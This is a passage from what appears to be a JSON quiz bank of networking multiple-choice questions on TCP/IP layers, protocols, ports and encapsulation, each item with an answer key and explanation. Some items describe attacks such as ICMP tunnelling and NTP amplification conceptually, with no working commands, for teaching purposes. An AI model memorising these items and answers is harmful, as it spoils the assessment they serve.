    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Why do many modern networking textbooks teach a 5-layer hybrid model rather than the strict 4-layer TCP/IP model?",
    "options": [
      "The 5-layer model was invented by Microsoft.",
      "The 4-layer model combines physical media and link-layer framing into a single 'Link' layer; separating Physical and Data Link layers aids technical clarity.",
      "The 4-layer model does not support wireless networking.",
      "International law mandates 5 layers for commercial internet service providers."
    ],
    "correct": 1,
    "explanation": "The 5-layer hybrid model separates Physical (Layer 1) and Data Link (Layer 2) from the TCP/IP 'Link' layer, providing clearer engineering distinction between hardware media and software framing."
  },
  {
    "id": "q_c2_m2_056",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which RFC document formally established the communication layer requirements for internet hosts?",
    "options": [
      "RFC 791",
      "RFC 1122",
      "RFC 2616",
      "RFC 1918"
    ],
    "correct": 1,
    "explanation": "RFC 1122 ('Requirements for Internet Hosts — Communication Layers') published in October 1989 defined the four-layer internet model."
  },
  {
    "id": "q_c2_m2_057",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Where does the Address Resolution Protocol (ARP) typically reside in the TCP/IP architecture?",
    "options": [
      "Application Layer",
      "Transport Layer",
      "Link Layer (bridging to the Internet Layer)",
      "Physical Layer only"
    ],
    "correct": 2,
    "explanation": "ARP operates at the Link Layer, packaged directly inside Ethernet frames to resolve Layer 3 IP addresses to Layer 2 MAC addresses."
  },
  {
    "id": "q_c2_m2_058",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which protocol provides diagnostic error reporting and ping reachability verification at the TCP/IP Internet Layer?",
    "options": [
      "SNMP (Simple Network Management Protocol)",
      "ICMP (Internet Control Message Protocol)",
      "IGMP (Internet Group Management Protocol)",
      "ARP (Address Resolution Protocol)"
    ],
    "correct": 1,
    "explanation": "ICMP (RFC 792/RFC 4443) operates as an integral companion to the Internet Layer, providing error reporting and connectivity diagnostics."
  },
  {
    "id": "q_c2_m2_059",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which transport protocol in the TCP/IP suite guarantees delivery, sequence ordering, and flow control?",
    "options": [
      "User Datagram Protocol (UDP)",
      "Transmission Control Protocol (TCP)",
      "Internet Protocol (IP)",
      "Address Resolution Protocol (ARP)"
    ],
    "correct": 1,
    "explanation": "TCP guarantees reliable, ordered byte-stream delivery with flow control and congestion avoidance."
  },
  {
    "id": "q_c2_m2_060",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which transport protocol in the TCP/IP suite provides connectionless, lightweight, best-effort datagram delivery with zero handshake overhead?",
    "options": [
      "Transmission Control Protocol (TCP)",
      "User Datagram Protocol (UDP)",
      "Hypertext Transfer Protocol (HTTP)",
      "Border Gateway Protocol (BGP)"
    ],
    "correct": 1,
    "explanation": "UDP provides simple, connectionless datagram transmission without establishing connections or guaranteeing packet arrival."
  },
  {
    "id": "q_c2_m2_061",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Why is the TCP/IP model sometimes referred to as the 'hourglass architecture'?",
    "options": [
      "Because it takes an hour to transmit data across the internet",
      "Because it features a wide range of applications at the top, a wide range of physical media at the bottom, but narrows to a single universal protocol (IP) in the middle",
      "Because packets expire after 60 seconds",
      "Because it uses sand-based silicon chips"
    ],
    "correct": 1,
    "explanation": "The 'hourglass model' reflects that diverse applications (HTTP, DNS, SSH) and diverse media (copper, fiber, Wi-Fi) all converge upon the single universal Internet Protocol (IP) at the waist."
  },
  {
    "id": "q_c2_m2_062",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "When network engineers refer to a 'Layer 4 Load Balancer', what protocol header fields are evaluated to distribute traffic?",
    "options": [
      "MAC addresses and VLAN tags",
      "IP addresses and TCP/UDP port numbers",
      "HTTP URIs and session cookies",
      "SSL certificate subject common names"
    ],
    "correct": 1,
    "explanation": "Layer 4 load balancing operates using Layer 3 IP addresses and Layer 4 TCP/UDP port numbers."
  },
  {
    "id": "q_c2_m2_063",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "In the TCP/IP model, which layer is responsible for translating human-readable domain names like 'bank.example.com' into numerical IP addresses?",
    "options": [
      "Link Layer",
      "Internet Layer",
      "Transport Layer",
      "Application Layer (via DNS)"
    ],
    "correct": 3,
    "explanation": "DNS is an Application Layer protocol in the TCP/IP suite that resolves domain names to IP addresses."
  },
  {
    "id": "q_c2_m2_064",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "What protocol suite won the commercial marketplace battle over the ISO OSI protocol suite in the late 1980s and 1990s?",
    "options": [
      "AppleTalk",
      "IPX/SPX",
      "TCP/IP",
      "DECnet"
    ],
    "correct": 2,
    "explanation": "TCP/IP won due to its pragmatic open-source implementation in BSD Unix, open standardization (RFCs), and vendor-neutral adoption on the ARPANET/Internet."
  },
  {
    "id": "q_c2_m2_065",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which layer in the 5-layer hybrid model corresponds directly to the physical cable, transceiver, and electrical signaling?",
    "options": [
      "Layer 1: Physical",
      "Layer 2: Data Link",
      "Layer 3: Network",
      "Layer 4: Transport"
    ],
    "correct": 0,
    "explanation": "Layer 1 in the 5-layer model is the Physical Layer, governing the transmission media, voltages, and bit encoding."
  },
  {
    "id": "q_c2_m2_066",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which TCP/IP layer handles end-to-end socket connections between client and server ports?",
    "options": [
      "Link Layer",
      "Internet Layer",
      "Transport Layer",
      "Physical Layer"
    ],
    "correct": 2,
    "explanation": "The Transport Layer manages end-to-end sockets identified by (Source IP, Source Port, Destination IP, Destination Port, Protocol)."
  },
  {
    "id": "q_c2_m2_067",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which protocol in the TCP/IP Internet Layer is utilized by the `traceroute` command to map network hops?",
    "options": [
      "DNS",
      "ICMP (via TTL Exceeded responses)",
      "HTTP",
      "ARP"
    ],
    "correct": 1,
    "explanation": "Traceroute transmits packets with incrementing TTL values; intermediate routers drop the expired packets and return ICMP Time Exceeded (Type 11) messages."
  },
  {
    "id": "q_c2_m2_068",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "At which TCP/IP layer do Network Interface Cards (NICs) and Wi-Fi chipsets operate?",
    "options": [
      "Application Layer",
      "Transport Layer",
      "Internet Layer",
      "Link Layer (Network Access)"
    ],
    "correct": 3,
    "explanation": "NICs and wireless adapters operate at the Link Layer, handling framing, MAC addressing, and physical media transceiving."
  },
  {
    "id": "q_c2_m2_069",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which TCP/IP application protocol provides secure, encrypted interactive command-line access over port 22?",
    "options": [
      "Telnet",
      "SSH (Secure Shell)",
      "FTP",
      "RDP"
    ],
    "correct": 1,
    "explanation": "SSH operates at the Application Layer (default port 22) to provide encrypted remote shell and command execution."
  },
  {
    "id": "q_c2_m2_070",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which protocol in the TCP/IP Application Layer provides dynamic allocation of IP addresses, subnet masks, and default gateways to client endpoints?",
    "options": [
      "DNS",
      "DHCP (Dynamic Host Configuration Protocol)",
      "SNMP",
      "NTP"
    ],
    "correct": 1,
    "explanation": "DHCP operates at the Application Layer (over UDP ports 67/68) to automatically distribute IP configurations to endpoints."
  },
  {
    "id": "q_c2_m2_071",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "When a host sends an IP packet to a destination on a different subnet, what destination MAC address is placed in the Link Layer header?",
    "options": [
      "The broadcast MAC address FF:FF:FF:FF:FF:FF",
      "The MAC address of the local Default Gateway router",
      "The MAC address of the remote destination host",
      "All zeros 00:00:00:00:00:00"
    ],
    "correct": 1,
    "explanation": "To reach a remote subnet, the host forwards the packet to its local default gateway router, using the router interface's MAC address as the Layer 2 destination."
  },
  {
    "id": "q_c2_m2_072",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which layer of the TCP/IP suite does the Dynamic Host Configuration Protocol (DHCP) use for transport?",
    "options": [
      "TCP",
      "UDP",
      "ICMP",
      "Raw IP"
    ],
    "correct": 1,
    "explanation": "DHCP utilizes UDP datagrams (port 67 on the server, port 68 on the client)."
  },
  {
    "id": "q_c2_m2_073",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "What is the standard port number for unencrypted HTTP web traffic versus encrypted HTTPS web traffic?",
    "options": [
      "Port 21 for HTTP, Port 22 for HTTPS",
      "Port 80 for HTTP, Port 443 for HTTPS",
      "Port 25 for HTTP, Port 110 for HTTPS",
      "Port 53 for HTTP, Port 8080 for HTTPS"
    ],
    "correct": 1,
    "explanation": "HTTP defaults to TCP port 80; HTTPS (HTTP over TLS) defaults to TCP port 443."
  },
  {
    "id": "q_c2_m2_074",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "Which protocol in the TCP/IP suite synchronizes system clocks across computer systems over packet-switched networks?",
    "options": [
      "NTP (Network Time Protocol)",
      "SNMP",
      "BGP",
      "SMTP"
    ],
    "correct": 0,
    "explanation": "NTP operates at the Application Layer over UDP port 123 to synchronize clocks with millisecond precision."
  },
  {
    "id": "q_c2_m2_075",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "medium",
    "q": "In the TCP/IP suite, why are ICMP messages encapsulated within IP packets rather than directly inside Ethernet frames?",
    "options": [
      "Because ICMP requires IP addressing to route error messages back to the originating host across multiple routers",
      "Because Ethernet cannot carry diagnostic data",
      "Because ICMP uses TCP port 0",
      "Because ICMP packets require encryption"
    ],
    "correct": 0,
    "explanation": "ICMP reports errors across routed networks, requiring Layer 3 IP source and destination addressing to traverse intermediate routers back to the sender."
  },
  {
    "id": "q_c2_m2_076",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "How does the modern QUIC protocol (RFC 9000) challenge traditional layered model boundaries compared to standard HTTPS (HTTP/2 over TLS over TCP)?",
    "options": [
      "QUIC runs directly over optical fiber without IP addressing.",
      "QUIC implements connection-oriented transport, stream multiplexing, and TLS 1.3 encryption inside user-space on top of UDP datagrams, blurring the line between Transport and Application layers.",
      "QUIC replaces Ethernet frames with ATM cells.",
      "QUIC runs inside the operating system kernel at Layer 2."
    ],
    "correct": 1,
    "explanation": "QUIC implements congestion control, loss recovery, and encryption on top of connectionless UDP in user-space, synthesizing Transport, Presentation, and Application functions."
  },
  {
    "id": "q_c2_m2_077",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "An enterprise network experiences an outage where internal hosts can ping external IP addresses (e.g. 8.8.8.8) but cannot open any websites by domain name. In the TCP/IP model, which layer and protocol has failed?",
    "options": [
      "Internet Layer (IP routing failure)",
      "Application Layer (DNS name resolution failure)",
      "Link Layer (Ethernet switch loop)",
      "Transport Layer (TCP socket failure)"
    ],
    "correct": 1,
    "explanation": "Because ping to numerical IP addresses succeeds (proving Link, Internet, and ICMP connectivity work), the failure to browse by domain name isolates the problem to Application Layer DNS resolution."
  },
  {
    "id": "q_c2_m2_078",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "Why is BGP (Border Gateway Protocol) classified functionally as a Layer 3 routing protocol, even though it relies on Layer 4 TCP port 179 for transport?",
    "options": [
      "BGP only works on Layer 2 unmanaged switches.",
      "Its operational purpose is exchanging Layer 3 network reachability and autonomous system routing paths, utilizing TCP simply as a reliable delivery mechanism.",
      "BGP packets have no IP headers.",
      "BGP encrypts all web traffic."
    ],
    "correct": 1,
    "explanation": "BGP manages Layer 3 inter-domain routing; it leverages Layer 4 TCP (port 179) to ensure reliable transmission of routing updates without reinventing transport reliability."
  },
  {
    "id": "q_c2_m2_079",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "A security analyst examines an intrusion where an attacker used ICMP Tunneling (e.g. using `ptunnel`) to bypass captive portal restrictions. How does this exploit violate standard TCP/IP architectural expectations?",
    "options": [
      "It converts electrical cables into radio antennas.",
      "It encapsulates unauthorized Layer 7 application data inside the optional payload field of Layer 3 ICMP Echo packets, bypassing firewalls that permit ICMP.",
      "It replaces the destination MAC address with the attacker's home address.",
      "It forces the switch to enter hub-emulation mode."
    ],
    "correct": 1,
    "explanation": "ICMP is designed for Layer 3 diagnostics. By embedding arbitrary application data into the payload of ICMP Echo requests/replies, attackers establish a covert tunnel across restrictive firewalls."
  },
  {
    "id": "q_c2_m2_080",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "In RFC 1122, host implementations are required to support the 'Robustness Principle' (Postel's Law). What is this design maxim and what security dilemma does it introduce?",
    "options": [
      "'Encrypt all packets at Layer 1'; creates massive latency.",
      "'Be conservative in what you do, be liberal in what you accept'; liberal parsing allows malformed or ambiguous attacker packets to bypass security filters while being processed by vulnerable endpoints.",
      "'Drop all packets without checksums'; causes dropped connections.",
      "'Only accept packets from authenticated MACs'; prevents public web servers."
    ],
    "correct": 1,
    "explanation": "Postel's Law states: 'Be conservative in what you send, be liberal in what you accept.' In security, liberal parsing of malformed packets often leads to evasion of IDS/IPS devices that interpret ambiguous headers differently than target endpoints."
  },
  {
    "id": "q_c2_m2_081",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "Why is it technically possible for an attacker to spoof the Source IP address in a UDP packet, but extremely difficult to establish a completed two-way TCP session with a spoofed Source IP?",
    "options": [
      "UDP uses 64-bit encryption, while TCP uses cleartext.",
      "UDP is connectionless with no handshake, so the packet is transmitted immediately; TCP requires a 3-way handshake where the server's SYN-ACK is sent to the spoofed IP, preventing the attacker from receiving sequence numbers to send the final ACK.",
      "Routers automatically drop all spoofed TCP packets but allow UDP.",
      "TCP ports cannot be spoofed by operating system kernels."
    ],
    "correct": 1,
    "explanation": "UDP packets are sent blindly with no response required. In TCP, the server replies to the spoofed IP with a SYN-ACK containing an unpredictable sequence number; unless the attacker can intercept or predict this number, the handshake cannot complete."
  },
  {
    "id": "q_c2_m2_082",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "An engineer configures an iptables firewall with the following rule: `iptables -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT`. At which layer of the TCP/IP stack does the state match extension (`-m state`) operate?",
    "options": [
      "Link Layer (inspecting MAC addresses)",
      "Internet Layer (inspecting IP fragments)",
      "Transport Layer (tracking TCP connection state transitions)",
      "Application Layer (inspecting SSH usernames)"
    ],
    "correct": 2,
    "explanation": "Connection tracking (`conntrack`) evaluates TCP flags (SYN, ACK, FIN) and sequence numbers to track Transport Layer (Layer 4) session state."
  },
  {
    "id": "q_c2_m2_083",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "When analyzing malware traffic, an analyst notes that a compromised endpoint transmits HTTP requests over TCP port 53. What evasion technique is being employed across TCP/IP layers?",
    "options": [
      "Layer 2 MAC spoofing",
      "Protocol-Port Mismatch / Egress Port Blending: running an unauthorized Layer 7 protocol (HTTP) over a port normally reserved for DNS (port 53) to bypass simple port-based firewall egress filters.",
      "Layer 1 frequency hopping",
      "Layer 3 BGP poisoning"
    ],
    "correct": 1,
    "explanation": "The attacker runs an HTTP C2 protocol across TCP port 53 (standard DNS port), tricking naive Layer 4 firewalls into treating the malicious stream as benign DNS traffic."
  },
  {
    "id": "q_c2_m2_084",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "What critical service does the Transport Layer's sliding window mechanism provide in TCP (RFC 9293)?",
    "options": [
      "Cryptographic key rotation every 60 seconds",
      "Flow control: preventing a fast sender from overwhelming a slow receiver's buffer capacity",
      "Dynamic IP address allocation across subnets",
      "Automatic translation between IPv4 and IPv6 headers"
    ],
    "correct": 1,
    "explanation": "The sliding window allows the receiver to advertise its available buffer space (Window Size), dynamically throttling the sender's transmission rate to prevent buffer overflow."
  },
  {
    "id": "q_c2_m2_085",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "How does Network Address Translation (NAT) violate the original architectural design principles of the TCP/IP protocol suite (RFC 1122 / RFC 791)?",
    "options": [
      "It introduces optical signal latency into copper cables.",
      "It breaks the 'end-to-end principle' by modifying Layer 3 IP addresses and Layer 4 port numbers inside intermediate routers, requiring routers to maintain state for end-to-end conversations.",
      "It eliminates the need for Layer 2 MAC addresses.",
      "It forces all web browsers to use encryption."
    ],
    "correct": 1,
    "explanation": "The original internet architecture assumed transparent end-to-end reachability where IP addresses remained constant from source to destination. NAT rewrites IP headers and port numbers midway, breaking direct peer-to-peer connectivity."
  },
  {
    "id": "q_c2_m2_086",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "In a dual-stack IPv4/IPv6 environment, an endpoint resolves a domain name and receives both an A record (IPv4) and an AAAA record (IPv6). What algorithm does modern operating systems use to select which Internet Layer protocol to attempt first?",
    "options": [
      "Spanning Tree Algorithm (802.1D)",
      "Happy Eyeballs Algorithm (RFC 8305)",
      "Dijkstra's Shortest Path Algorithm",
      "Diffie-Hellman Key Exchange"
    ],
    "correct": 1,
    "explanation": "RFC 8305 ('Happy Eyeballs v2') specifies that client applications initiate connection attempts over IPv6 and IPv4 simultaneously with a slight stagger, utilizing whichever protocol connects fastest to ensure optimal user experience."
  },
  {
    "id": "q_c2_m2_087",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "Why is the TCP checksum calculation unique among protocol layers in that it incorporates a 'pseudo-header'?",
    "options": [
      "The checksum is encrypted with the user's password.",
      "The TCP checksum includes fields from the Layer 3 IP header (Source IP, Destination IP, Protocol, and TCP Length) to protect against misrouted segments delivered to the wrong host.",
      "The checksum includes the physical MAC address of the default gateway.",
      "The checksum calculates the latency of the optical fiber link."
    ],
    "correct": 1,
    "explanation": "The TCP checksum includes a pseudo-header containing source/destination IP addresses and protocol number, ensuring that if a router corrupts the IP header and delivers the packet to the wrong endpoint, TCP will detect the error."
  },
  {
    "id": "q_c2_m2_088",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "What is the function of the TCP/IP Link Layer's Maximum Transmission Unit (MTU) when an application attempts to transmit a 64 KB file over a single UDP socket call?",
    "options": [
      "The NIC rejects the file with an out-of-memory error.",
      "The Internet Layer must fragment the 64 KB IP datagram into multiple smaller IP packets that each fit within the 1,500-byte MTU of the underlying Link Layer.",
      "The switch compresses the file into a single 64 KB Ethernet frame.",
      "The application automatically switches to TCP."
    ],
    "correct": 1,
    "explanation": "Because UDP does not segment application streams, the IP layer must fragment the oversized datagram into multiple smaller fragments to satisfy the Link Layer MTU."
  },
  {
    "id": "q_c2_m2_089",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "Why is IP fragmentation considered a security vulnerability in enterprise networks?",
    "options": [
      "Fragments cannot be encrypted with AES.",
      "Attackers exploit fragmentation to bypass firewalls and NIDS by splitting malicious payloads across fragments, overlapping fragment offsets, or exhausting reassembly buffers (Teardrop attacks).",
      "Fragmented packets cause physical copper wires to overheat.",
      "Fragments alter the hardware MAC address of the default gateway."
    ],
    "correct": 1,
    "explanation": "Fragmentation allows attackers to hide exploits across fragment boundaries (where the first fragment lacks the full Layer 4 header and subsequent fragments contain malicious payload), evading stateful inspection engines."
  },
  {
    "id": "q_c2_m2_090",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "An enterprise deploys a DNS-over-HTTPS (DoH - RFC 8484) policy across all corporate workstations. What is the operational impact on enterprise network security monitoring?",
    "options": [
      "DNS queries are converted into cleartext broadcast frames at Layer 2.",
      "Internal DNS telemetry is encrypted inside HTTPS (port 443) sessions, blinding traditional perimeter network sensors and DNS firewall filters from monitoring malicious domain lookups.",
      "Workstations can no longer resolve internal Active Directory domain controllers.",
      "The physical link speed drops by 90% due to packet collisions."
    ],
    "correct": 1,
    "explanation": "DoH encrypts DNS queries inside standard TLS/HTTPS traffic to public resolvers, preventing corporate firewalls and NIDS from monitoring, logging, or blocking queries to malicious domains."
  },
  {
    "id": "q_c2_m2_091",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "How does the TCP 3-way handshake defend against accidental connection duplication caused by delayed duplicate packets traversing the Internet Layer?",
    "options": [
      "By verifying the physical MAC address of the client NIC",
      "By exchanging synchronized Initial Sequence Numbers (ISNs) and requiring explicit acknowledgement (SYN, SYN-ACK, ACK) before allocating connection resources",
      "By requiring client certificates for all TCP sessions",
      "By locking the physical switch port until the session ends"
    ],
    "correct": 1,
    "explanation": "ISNs uniquely identify byte streams; if a delayed duplicate SYN arrives from an old connection, the host can distinguish it from the current sequence space and reset or ignore it."
  },
  {
    "id": "q_c2_m2_092",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "Why is TCP port 0 reserved and prohibited for use in standard network socket communications?",
    "options": [
      "It is reserved for optical fiber light pulses.",
      "In Berkeley sockets programming, port 0 is an operational code directing the operating system to dynamically assign an available ephemeral port; receiving packets on port 0 often indicates scanning or malformed fuzzing.",
      "Port 0 is reserved for root user SSH sessions.",
      "Port 0 indicates an encrypted IPsec tunnel."
    ],
    "correct": 1,
    "explanation": "In network programming, requesting port 0 signals the OS to allocate a dynamic ephemeral port. Packets appearing on the wire with port 0 are invalid and frequently indicate port scanning (e.g. Nmap) or OS fingerprinting probes."
  },
  {
    "id": "q_c2_m2_093",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "An incident responder investigates a server crash caused by a 'Ping of Death' attack. What specific protocol mechanism was exploited?",
    "options": [
      "Flooding the server with 10 million SYN packets",
      "Transmitting an oversized ICMP Echo Request packet that, when reassembled from IP fragments, exceeded the maximum legal IPv4 packet size of 65,535 bytes, causing an operating system buffer overflow",
      "Modifying the Ethernet preamble to 128 bytes",
      "Overwriting the router's BGP routing table with 0.0.0.0/0"
    ],
    "correct": 1,
    "explanation": "The Ping of Death exploited an IP reassembly flaw where malicious fragments assembled into an IP packet exceeding the 65,535-byte protocol maximum, causing kernel buffer overflows."
  },
  {
    "id": "q_c2_m2_094",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "In the TCP/IP architecture, what is the role of the Ephemeral Port Range (typically 49152 to 65535 per IANA)?",
    "options": [
      "They are reserved for well-known server services like HTTP and SSH.",
      "They provide temporary, dynamically assigned source port numbers for outbound client connections to uniquely identify the return traffic socket.",
      "They are used exclusively by routers for BGP route distribution.",
      "They provide hardware addresses for wireless access points."
    ],
    "correct": 1,
    "explanation": "When a client connects to a server, the OS assigns a temporary ephemeral port as the source port, enabling return packets to be routed to the correct local socket."
  },
  {
    "id": "q_c2_m2_095",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "What is the purpose of the TCP Reset (RST) flag in transport layer operations?",
    "options": [
      "To request an orderly graceful shutdown of the connection after all data is sent",
      "To immediately abort a connection, reject an incoming connection request on an unlistened port, or terminate an invalid state",
      "To request retransmission of the last 10 packets",
      "To synchronize the window scale factor"
    ],
    "correct": 1,
    "explanation": "The RST flag abruptly tears down a connection without a graceful FIN handshake, typically sent when a packet arrives for an unallocated port or invalid state."
  },
  {
    "id": "q_c2_m2_096",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "Why does the User Datagram Protocol (UDP) header require only 8 bytes of overhead, compared to 20 to 60 bytes for TCP?",
    "options": [
      "UDP lacks source and destination port numbers.",
      "UDP provides no delivery guarantees, flow control, sequence numbers, or acknowledgement tracking; its header contains only Source Port, Destination Port, Length, and Checksum.",
      "UDP encrypts the entire header using AES-GCM.",
      "UDP packets are routed without IP headers."
    ],
    "correct": 1,
    "explanation": "The UDP header is minimal (8 bytes: 2B Source Port, 2B Dest Port, 2B Length, 2B Checksum) because it omits sequence tracking, acknowledgements, window sizes, and options."
  },
  {
    "id": "q_c2_m2_097",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "When an attacker launches an NTP Amplification attack, which two protocol characteristics of the TCP/IP suite are leveraged?",
    "options": [
      "TCP 3-way handshakes and SSL certificate pinning",
      "Connectionless UDP transport allowing spoofed victim source IPs, and an Application Layer command (`monlist`) that returns a response significantly larger than the request",
      "Layer 2 MAC flooding and ARP poisoning",
      "BGP autonomous system path manipulation"
    ],
    "correct": 1,
    "explanation": "NTP amplification leverages UDP's lack of source IP verification (spoofing the victim's IP) and the application `monlist` command, which generates response packets up to 50 times larger than the query."
  },
  {
    "id": "q_c2_m2_098",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "How does the Address Resolution Protocol (ARP) communicate when a host needs to resolve an IP address whose MAC is not in its local cache?",
    "options": [
      "It transmits a unicast frame to the root DNS server.",
      "It broadcasts an ARP Request frame to destination MAC FF:FF:FF:FF:FF:FF asking 'Who has this IP? Tell my MAC', and the owner replies with a unicast ARP Reply.",
      "It queries the DHCP server over TCP port 67.",
      "It generates an ICMP Echo Request."
    ],
    "correct": 1,
    "explanation": "The host broadcasts an ARP Request (`FF:FF:FF:FF:FF:FF`) across the local Layer 2 broadcast domain; the target host unicasts an ARP Reply with its MAC address."
  },
  {
    "id": "q_c2_m2_099",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "What is the security hazard of 'Gratuitous ARP' in enterprise switched networks?",
    "options": [
      "It causes optical fiber connectors to disconnect.",
      "It allows a host to broadcast an unrequested ARP announcement updating other hosts' caches; attackers abuse this to execute ARP cache poisoning and man-in-the-middle attacks without verification.",
      "It permanently wipes the router's flash memory.",
      "It disables all firewall state tables."
    ],
    "correct": 1,
    "explanation": "Gratuitous ARP updates neighboring caches without an initial request. Attackers exploit this behavior to poison ARP tables, redirecting gateway traffic through their sniffing machines."
  },
  {
    "id": "q_c2_m2_100",
    "topic": "TCP/IP Model Architecture",
    "difficulty": "difficult",
    "q": "In enterprise perimeter engineering, what is the primary security advantage of deploying a Forward Proxy for outbound employee web access?",
    "options": [
      "It increases physical Wi-Fi signal strength.",
      "It terminates client TCP connections, inspects Layer 7 HTTP/HTTPS requests against URL reputation policies, enforces authentication, and re-initiates an isolated TCP session to the external web server.",
      "It eliminates the need for Layer 3 IP routing.",
      "It assigns public IP addresses to every internal laptop."
    ],
    "correct": 1,
    "explanation": "A forward proxy breaks the direct end-to-end transport connection, terminating client sessions to inspect and filter Layer 7 web traffic before establishing separate outbound sessions."
  },
  {
    "id": "q_c2_m2_101",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the formal name for the Protocol Data Unit (PDU) at the Data Link layer?",
    "options": [
      "Packet",
      "Segment",
      "Frame",
      "Datagram"
    ],
    "correct": 2,
    "explanation": "The PDU at the Data Link layer (Layer 2) is formally designated as a 'Frame'."
  },
  {
    "id": "q_c2_m2_102",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the formal name for the Protocol Data Unit (PDU) at the Network layer (Layer 3)?",
    "options": [
      "Segment",
      "Packet",
      "Frame",
      "Bit"
    ],
    "correct": 1,
    "explanation": "The PDU at the Network layer (Layer 3) is formally designated as a 'Packet' (or IP Datagram)."
  },
  {
    "id": "q_c2_m2_103",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the formal name for the Protocol Data Unit (PDU) at the Transport layer when utilizing UDP?",
    "options": [
      "Segment",
      "Frame",
      "Datagram",
      "Packet"
    ],
    "correct": 2,
    "explanation": "At Layer 4, connectionless UDP data is termed a 'Datagram' (or UDP Packet), while TCP data is termed a 'Segment'."
  },
  {
    "id": "q_c2_m2_104",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the formal name for the Protocol Data Unit (PDU) at the Physical layer (Layer 1)?",
    "options": [
      "Frames",
      "Packets",
      "Bits / Symbols",
      "Segments"
    ],
    "correct": 2,
    "explanation": "The Physical layer processes raw digital 'Bits' or modulated physical 'Symbols' across the communication channel."
  },
  {
    "id": "q_c2_m2_105",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "During transmission, what is the process of adding protocol headers to data as it moves down the stack called?",
    "options": [
      "Decapsulation",
      "Encapsulation",
      "Demultiplexing",
      "Serialization"
    ],
    "correct": 1,
    "explanation": "Encapsulation is the process where each layer prepends a header (and optional trailer) to the data received from the layer above."
  },
  {
    "id": "q_c2_m2_106",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "When a host receives a frame from the network and strips off the Ethernet, IP, and TCP headers to deliver payload to an app, what is this process called?",
    "options": [
      "Encapsulation",
      "Decapsulation",
      "Compression",
      "Modulation"
    ],
    "correct": 1,
    "explanation": "Decapsulation is the reverse process where receiving hosts strip headers layer by layer as data ascends the stack."
  },
  {
    "id": "q_c2_m2_107",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "Which field in the Ethernet II frame header acts as the demultiplexing key instructing the NIC which protocol handler receives the payload?",
    "options": [
      "Preamble",
      "Source MAC",
      "EtherType",
      "Frame Check Sequence"
    ],
    "correct": 2,
    "explanation": "The 2-byte EtherType field (e.g. 0x0800 for IPv4, 0x86DD for IPv6, 0x0806 for ARP) directs the frame to the correct higher-layer protocol handler."
  },
  {
    "id": "q_c2_m2_108",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "Which field in the IPv4 header acts as the demultiplexing key indicating whether the encapsulated payload is TCP, UDP, or ICMP?",
    "options": [
      "Type of Service (DSCP)",
      "Identification",
      "Protocol field",
      "Time to Live"
    ],
    "correct": 2,
    "explanation": "The 8-bit Protocol field in the IP header (e.g. 6 for TCP, 17 for UDP, 1 for ICMP) identifies the encapsulated Layer 4 protocol."
